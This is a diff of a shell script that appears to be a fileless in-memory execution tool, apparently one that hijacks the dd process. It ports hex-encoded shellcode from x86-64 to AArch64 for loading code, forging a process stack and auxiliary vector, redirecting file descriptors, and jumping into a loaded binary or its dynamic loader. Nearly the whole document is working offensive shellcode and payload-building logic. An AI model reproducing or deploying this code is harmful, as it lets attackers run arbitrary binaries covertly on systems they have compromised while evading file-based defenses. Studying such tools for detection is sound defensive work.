@@ -298,7 +298,7 @@ shellcode_loader()
             sc=$sc$(load_imm 2 $fsize)
             sc=$sc"000000ca010000d4"
             # and make sure to read exactly $fsize bytes
-            sc=$sc"420000cb2100008b5f0000f160ffff54"
+            sc=$sc"420000cb2100008b5f0000f161ffff54"
 
             # mprotect()
             sc=$sc"481c80d2"
@@ -396,9 +396,11 @@ shellcode_loader()
 # craft_stack $phaddr $phentsize $phnum $ld_base $entry $argv0 .. $argvn
 craft_stack()
 {
+    local stack_top=$(echo "$dd_maps" | grep -F "[stack]" |\
+                      cut -d' ' -f1 | cut -d'-' -f2)
     # Calculate position of argv[0]
     args_len=$(echo "$@" | cut -d' ' -f6- | wc -c)
-    argv0_addr=$((0x7ffffffff000 - 8 - $args_len))
+    argv0_addr=$((0x$stack_top - 8 - $args_len))
 
     # Place arguments for main()
     local count=0
@@ -441,35 +443,19 @@ craft_stack()
     auxv=$auxv"1900000000000000"$at_random         # AT_RANDOM
     auxv=$auxv"0600000000000000""0010000000000000" # AT_PAGESZ
     auxv=$auxv"0000000000000000""0000000000000000" # AT_NULL
-    auxv=$auxv"aaaaaaaaaaaaaaaa""bbbbbbbbbbbbbbbb" # Will be two random values
+    auxv=$auxv"aaaaaaaaaaaaaaaa""bbbbbbbbbbbbbbbb" # Should be two random values
 
     stack=$stack$auxv$args"0000000000000000" # NULL at the end of the stack
 
-    # read() all this data into the stack and make rsp point to it
+    # read() all this data into the stack and make sp point to it
     local sc=""
     local stack_len=$((${#stack} / 2))
-    local rsp=$(endian $(printf %016x $((0x7ffffffff000 - $stack_len))))
-    stack_len=$(endian $(printf %08x $stack_len))
-    sc=$sc"48bc"$rsp
-    sc=$sc"4831ff4889e6ba${stack_len}4889f80f0529c24801c685d275f3"
-
-    # Reuse canary and PTR_MANGLE key, place them in AT_RANDOM field of the auxv
-    sc=$sc"48bb"$at_random
-    sc=$sc"64488b04252800000048890380c30864488b042530000000488903"
-
-    # A failed experiment...
-    # # prctl()
-    # sc=$sc"b89d000000" # prctl
-    # sc=$sc"bf23000000" # PR_SET_MM
-    # sc=$sc"be08000000" # PR_SET_MM_ARG_START
-    # sc=$sc"48ba"$(endian $(printf %016x $argv0_addr))
-    # sc=$sc"4d31d24d89d0" # arg4 = arg5 = 0
-    # sc=$sc"0f05"
-    # sc=$sc"b89d000000" # prctl
-    # sc=$sc"bf23000000" # PR_SET_MM
-    # sc=$sc"be09000000" # PR_SET_MM_ARG_END
-    # sc=$sc"48baf8efffffff7f0000"
-    # sc=$sc"0f05"
+    local sp=$(printf %016x $((0x$stack_top - $stack_len)))
+    stack_len=$(printf %08x $stack_len)
+    sc=$sc$(load_imm 0 $sp)"1f000091"
+    sc=$sc$(load_imm 2 $stack_len)
+    sc=$sc"e80780d2e1030091000000ca010000d4"
+    sc=$sc"420000cb2100008b5f0000f161ffff54"
 
     echo -n $stack $sc
 }
@@ -505,7 +491,7 @@ craft_payload2()
     # dd makes stdin and stdout point to the input and output of data (if & of)
     # Fortunately stderr still points to the terminal, so we can make
     # dup2(2, 1); dup2(2, 0); to fix this
-    sc=${sc}"4831c0b0024889c7b0014889c6b0210f054831c04889c6b0024889c7b0210f05"
+    sc=${sc}"420002ca080380d2400080d2210080d2010000d4400080d2e10302aa010000d4"
 
     if [ -n "$(echo -n $bin | search_section bin "" .interp)" ] # Dynamic binary
     then
@@ -518,17 +504,18 @@ craft_payload2()
         ld_start_addr=$((0x$ld_start_addr + 0x$ld_base))
         ld_start_addr=$(printf %016x $ld_start_addr)
 
-        sc=$sc"48b8"$(endian $ld_start_addr)
+        sc=$sc$(load_imm 0 $ld_start_addr)
     else                                                        # Static binary
-        sc=$sc"48b8"$entry # Just jump to the binary's entrypoint
+        sc=$sc$(load_imm 0 $(endian $entry)) # Just jump to the binary's entry
     fi
     # Nothing happened here, dd never existed.
     # It was all a dream!
-    sc=$sc"ffe0"
+    sc=$sc"00001fd6"
 
     if [ $DEBUG -eq 1 ]; then sc="00000014"$sc; fi
 
     local sc_len=$(printf "%016x" $((${#sc} / 2)))
+
     echo -n $sc_len $sc$writebin$stack $interp
 }
 
@@ -547,7 +534,7 @@ find_gadget()
 }
 craft_rop()
 {
-    return
+    return # Can't exist without `find_gadget()'
     # # Where is located the libc without ASLR in this system
     # local libc_base=$(echo "$dd_maps" | grep $libc_path | head -n1 |\
     #                   cut -d'-' -f1)
